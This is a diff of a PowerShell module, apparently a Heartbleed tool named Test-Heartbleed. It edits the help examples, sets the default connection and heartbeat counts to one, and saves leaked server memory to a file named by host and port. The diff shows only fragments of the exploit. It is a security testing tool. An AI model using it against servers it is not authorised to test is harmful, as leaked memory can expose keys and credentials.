@@ -67,32 +67,12 @@ Acknowledgments to Tim Tomes.
 
 .EXAMPLE
 
-Test-Heartbleed -ComputerName 192.168.22.22 -Verbose
-VERBOSE: Testing 192.168.22.22
-VERBOSE: Sending Heartbeat support test packet
-VERBOSE: Connection attempt number: 1
-VERBOSE: Sending 3 TLS heartbeat packets
-VERBOSE: :   226 bytes returned from server. (226 total bytes)
-VERBOSE: :     0 bytes returned from server. (226 total bytes)
-VERBOSE: :     0 bytes returned from server. (226 total bytes)
-VERBOSE: Connection attempt number: 2
-VERBOSE: Sending 3 TLS heartbeat packets
-VERBOSE: :     7 bytes returned from server. (233 total bytes)
-VERBOSE: :     0 bytes returned from server. (233 total bytes)
-VERBOSE: :     0 bytes returned from server. (233 total bytes)
-VERBOSE: Connection attempt number: 3
-VERBOSE: Sending 3 TLS heartbeat packets
-VERBOSE: :     7 bytes returned from server. (240 total bytes)
-VERBOSE: :     0 bytes returned from server. (240 total bytes)
-VERBOSE: :     0 bytes returned from server. (240 total bytes)
+Usage example within CMD.EXE only.  Assumes that module is contained within
+current working directory.
 
-Other examples:
+C:\>powershell -command (Import-Module ./powerbleed.psm1); Test-Heartbleed -Computername 10.10.1.150 -Verbose
 
-Test-Heartbleed -Computername 192.168.22.22 | Select-Object -ExpandProperty Bytes | Set-Content -Encoding Byte -Path hbdata.txt
 
-Test-Heartbleed -Computername 192.168.22.22 -TLSTries 1 -Heartbeats 1
-
-Test-Heartbleed -Computername 192.168.22.22 -HBLen 16384
 
 #>
 
@@ -120,11 +100,11 @@ function Test-Heartbleed
 
         [Parameter(
             HelpMessage="Number of TLS connection attempts to make")]
-            [int]$TLSTries=3,
+            [int]$TLSTries=1,
 
         [Parameter(
             HelpMessage="Number of heartbeats to send")]
-            [int]$Heartbeats=3,
+            [int]$Heartbeats=1,
 
         [Parameter(
             HelpMessage="Length of the heartbeat packet")]
@@ -395,7 +375,8 @@ function Test-Heartbleed
             
             if ($WriteFile)
             {
-                $filename = "$computer-hb.dat"
+                $cwd = Split-Path -parent $PSCommandPath
+                $filename = "$cwd\\$computer-port$Port-hb.dat"
                 Write-Verbose -Message "Writing binary data to $filename"
                 [IO.File]::WriteAllBytes($filename,$buf[0..$offset])
             }
